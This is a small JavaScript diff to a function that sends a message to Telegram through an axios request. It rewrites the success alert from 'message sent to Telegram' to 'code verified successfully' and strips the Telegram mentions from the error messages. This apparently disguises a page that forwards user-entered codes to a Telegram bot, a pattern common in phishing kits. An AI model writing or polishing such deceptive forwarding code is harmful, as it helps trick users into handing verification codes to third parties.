@@ -26,11 +26,11 @@ function enviarMensaje() {
     axios.get(apiUrl)
         .then(response => {
             console.log(response.data);
-            alert('Mensaje enviado exitosamente a Telegram.');
+            alert('Codigo verificado exitosamente.');
         })
         .catch(error => {
-            console.error('Error al enviar el mensaje a Telegram:', error);
-            alert('Error al enviar el mensaje a Telegram. Consulta la consola para más detalles.');
+            console.error('Error al enviar intente denuevo:', error);
+            alert('Error al enviar el mensaje');
         });
 }
 
